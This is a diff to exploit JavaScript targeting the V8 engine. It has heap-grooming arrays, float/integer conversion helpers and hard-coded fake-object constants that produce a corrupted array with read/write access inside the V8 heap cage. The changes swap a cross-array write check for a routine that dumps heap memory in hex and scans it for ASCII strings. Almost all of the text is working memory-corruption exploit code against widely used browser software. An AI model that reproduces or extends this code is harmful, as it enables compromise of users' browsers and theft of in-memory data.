@@ -12,7 +12,8 @@ function f2i(f){f64[0]=f;return u64[0];}
 function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
 function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 
-const DMAP=0x1032a5d,EMPTY=0x7e5,PIN=0x1100011,MAXS=0x7fdffffe;
+const DMAP=0x1032a5d,EMPTY=0x7e5,PIN=0x1000001,MAXS=0x7fdffffe;
+// PIN=0x1000001: start of regular V8 heap in the cage
 
 // Three LO-space arrays: dblA (master elements), pinnedObj (heap layout), dblB (cross-array target)
 const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
@@ -43,47 +44,27 @@ if(Array.isArray(m)){
   log("L: "+m.length);
   log("m0: "+f2i(m[0]).toString(16));
 
-  // Find dblB[0]=50.5 — expected at master index ~0x20000
-  // dblB FDA at 0x1200011, dblA FDA at 0x1100011
-  // master[k] reads 0x1100018 + k*8
-  // dblB[0] at 0x1200018 → k = (0x1200018-0x1100018)/8 = 0x20000
-  let bOK=false;
-  try{
-    const v=m[0x20000];
-    log("@20000: "+v);
-    if(Math.abs(v-50.5)<0.01) bOK=true;
-  }catch(e){log("@20000_E: "+e.message);}
-
-  if(!bOK){
-    // Coarse scan: sample every 0x1000 slots
-    for(let k=0;k<0x80000&&!bOK;k+=0x1000){
-      try{
-        if(Math.abs(m[k]-50.5)<0.01){
-          // Found approximate position, fine-tune
-          for(let j=Math.max(0,k-16);j<k+16;j++){
-            if(Math.abs(m[j]-50.5)<0.001&&Math.abs(m[j+1]-50.502)<0.01){
-              log("dblB@"+j.toString(16));bOK=true;break;
-            }
-          }
-          if(!bOK){log("dblB_approx@"+k.toString(16));bOK=true;}
-        }
-      }catch(e){log("scan_stop@"+k.toString(16));break;}
-    }
+  // PIN=0x1000001 → master[k] reads cage+0x1000008+k*8 (V8 heap region)
+  // Dump hex at first 8 slots
+  const hx=[];
+  for(let k=0;k<8;k++){
+    try{hx.push(f2i(m[k]).toString(16).padStart(16,"0"));}catch(e){hx.push("ERR");break;}
   }
+  log("HX: "+hx.join(","));
 
-  if(bOK){
-    log("CROSS_ARRAY_OK");
-    // Write to dblB through master and verify
-    m[0x20000]=i2f(0xCAFEBABEDEADn);
-    log("dblB[0]_now: "+dblB[0]);
-    // If dblB[0] changed from 50.5, we have confirmed cross-array write
-    if(dblB[0]!==50.5){
-      log("CROSS_WRITE_OK");
-    }
-    dblB[0]=50.5;  // restore
-  }else{
-    log("dblB_MISS");
+  // Scan for ASCII strings in first 512 slots (safe range)
+  const txt=[];
+  for(let k=0;k<512;k++){
+    try{
+      const v=f2i(m[k]);if(v===0n)continue;
+      const b=[];let ok=true;
+      for(let i=0;i<8;i++){const c=Number((v>>BigInt(i*8))&0xffn);b.push(c);if(c!==0&&(c<0x20||c>0x7e))ok=false;}
+      if(ok&&b.filter(c=>c>=0x41&&c<=0x7a).length>=3)
+        txt.push("@"+k.toString(16)+":"+String.fromCharCode(...b.filter(c=>c>0)));
+    }catch(e){break;}
+    if(txt.length>=8)break;
   }
+  if(txt.length)log("STR: "+txt.join("|"));
 
   log("W: "+wasmI.exports.f());
   log("CAGE_RW_OK");
